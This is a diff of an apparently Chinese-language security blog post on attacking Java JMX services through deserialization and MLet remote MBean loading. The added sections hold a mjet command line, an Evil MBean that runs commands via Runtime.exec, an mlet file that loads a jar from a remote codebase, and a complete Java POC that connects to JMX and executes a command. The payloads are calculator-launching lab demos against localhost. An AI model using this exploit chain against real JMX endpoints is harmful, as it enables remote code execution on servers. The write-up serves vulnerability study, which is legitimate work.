@@ -1,8 +1,8 @@
-# JMX-Attack(1)
+# JMX-Attack
 
-  
-  
-&lt;!--more--&gt;  
+    
+    
+&lt;!--more--&gt;    
 ## 0x00 基础知识  
 JMX时Java1.5引入的新特性，全称为`Java Management Extension`，即Java管理扩展，是管理/监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里的例子中的MBean类是Hello，接口为HelloMBean。  
 ```java  
@@ -98,7 +98,7 @@ javax.naming.InitialContext.lookup(InitialContext.java:417)
 当客户端使用`JMXConnectorFactory.connect`去连接服务端时，最终调用到`javax.management.remote.rmi.RMIServerImpl_Stub#newClinet`发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：new Client方法参数为Object类型，可以塞入我们的恶意Payload(利用JMXConnector.CREDENTIALS配置添加)，  
 ```java  
 public static void main(String[] args) throws Exception {  
-    Object obj = new Groovy1().getObject(&#34;open -a Calculator&#34;);  
+    Object obj = new Groovy1().getObject(&#34;calc&#34;);  
     connectWithJmxUrlByObject(obj);  
 }  
   
@@ -115,6 +115,100 @@ private static void connectWithJmxUrlByObject(Object credentials) throws Malform
 ```  
 具体漏洞详情可参考  
 https://su18.org/post/rmi-attack/#1-%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0  
+## 0x05 JMX层MBean方法getLoggerLevel/gcClassHistogram利用方式  
+当JMX客户端调用`createMBean/getObjectInstance/invoke`等方法时，服务端处理时会先经过`sun.rmi.server.UnicastServerRef#dispatch`进行分发，当不执行RMI内置的`bind/lookup/dirty`方法时，会进入`调用自定义方法`的逻辑。  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502182355091.png)
+客户端调用`createMBean/getAttribute`等内置方法，服务端到达`javax.management.remote.rmi.RMIConnectionImpl#invoke`中  
+- 调用`java.rmi.MarshalledObject#get`还原参数值  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190000526.png)
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190007850.png)
+调用到其`get`方法，进行`readObject`  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190008762.png)
+https://github.com/mogwailabs/mjet/  
+利用`MLET`工具，进行攻击  
+`jython mjet.py localhost 1099 deserialize CommonsCollections6 &#34;open -a Calculator&#34;`  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190016111.png)
+  
+## 0x06 MLET动态加载Evil MBean利用方式  
+除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用`javax.management.loading.MLet`MBean并调用其`getMBeanFromURL`操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的MBean操作而不需要客户端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也存在说明  
+[https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html](https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html)  
+分析下`getMBeansFromURL`方法是如何操作的，  
+`javax.management.loading.MLet#getMBeansFromURL(java.lang.String)`分为两步  
+1、加载mlet文件解析标签  
+2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址(第一步得到的codebase&#43;archive属性值)进行加载  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172327747.png)
+`parse`方法解析`&lt;mlet&gt;`标签的内容并放入`attributes`  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172329796.png)
+接着返回到`getMBeansFromURL`方法调用`com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean`创建MBean  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172332303.png)
+调用到`com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean`时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172333048.png)
+最终在`com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass`中使用`MLET classloader`去加载`org.example.Evil.Evil`类  
+其中`MLET`类是`URLClassLoader`加载器  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172341211.png)
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172345101.png)
+创建Evil类及EvilMBean接口(恶意操作为runCommand)，并将其打包为`JMXEvilBean.jar`  
+```java  
+// EvilMBean.java  
+package org.example.Evil;    
+import java.io.IOException;    
+public class Evil implements EvilMBean {    
+    @Override    
+    public String runCommand(String command) throws IOException {    
+        Runtime.getRuntime().exec(command);    
+        return &#34;success&#34;;    
+    }    
+}  
+//Evil.java  
+package org.example.Evil;    
+import java.io.IOException;    
+public interface EvilMBean {    
+    public String runCommand(String command) throws IOException;    
+}  
+```  
+MLET文件  
+`&lt;mlet code=&#34;org.example.Evil.Evil&#34; archive=&#34;JmxEvilBean.jar&#34; name=&#34;MLetCompromise:name=evil,id=10&#34; codebase=&#34;http://localhost:8888&#34;&gt;&lt;/mlet&gt;`  
+创建MLet MBean、invoke调用getMBeanFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果  
+POC  
+```java  
+package org.example.Attack;    
+    
+import javax.management.*;    
+import javax.management.remote.JMXConnector;    
+import javax.management.remote.JMXConnectorFactory;    
+import javax.management.remote.JMXServiceURL;    
+import java.io.IOException;    
+import java.util.HashSet;    
+import java.util.Iterator;    
+    
+public class JMXAttack {    
+    public static void main(String[] args) throws ReflectionException, InstanceNotFoundException, MBeanException, IOException, MalformedObjectNameException, NotCompliantMBeanException, InstanceAlreadyExistsException {    
+        String serverName = &#34;127.0.0.1&#34;;    
+        String port = &#34;1099&#34;;    
+        String command = &#34;open -a Calculator&#34;;    
+        //1、连接JMX服务    
+        JMXServiceURL u = new JMXServiceURL(&#34;service:jmx:rmi:///jndi/rmi://&#34; &#43; serverName &#43; &#34;:&#34; &#43; port &#43; &#34;/jmxrmi&#34;);    
+        JMXConnector c = JMXConnectorFactory.connect(u);    
+        MBeanServerConnection m = c.getMBeanServerConnection();    
+        //2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1    
+        ObjectInstance evil = m.createMBean(&#34;javax.management.loading.MLet&#34;, new ObjectName(&#34;test.Mbean:type=MLet,id=1&#34;));    
+        //3、调用MBean的getMBeansFromURL操作，从http://localhost:8888/mlet加载mlet文件创建新的MBean    
+        Object res = m.invoke(evil.getObjectName(), &#34;getMBeansFromURL&#34;, new Object[]{&#34;http://127.0.0.1:8888/MLET&#34;},new String[] { String.class.getName() } );    
+    
+        HashSet res_set = ((HashSet)res);    
+        Iterator itr = res_set.iterator();    
+        Object nextObject = itr.next();    
+        //4、invoke调用新的MBean的runCommand操作并返回结果    
+        ObjectInstance evil_bean = ((ObjectInstance)nextObject);    
+        System.out.println(&#34;Loaded class: &#34;&#43;evil_bean.getClassName()&#43;&#34; object &#34;&#43;evil_bean.getObjectName());    
+        System.out.println(&#34;Calling runCommand with: &#34;&#43;command);    
+        Object result = m.invoke(evil_bean.getObjectName(), &#34;runCommand&#34;, new Object[]{ command }, new String[]{ String.class.getName() });    
+        System.out.println(&#34;Result: &#34;&#43;result);    
+    }    
+}  
+```  
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172308964.png)
+  
 
 ---
 
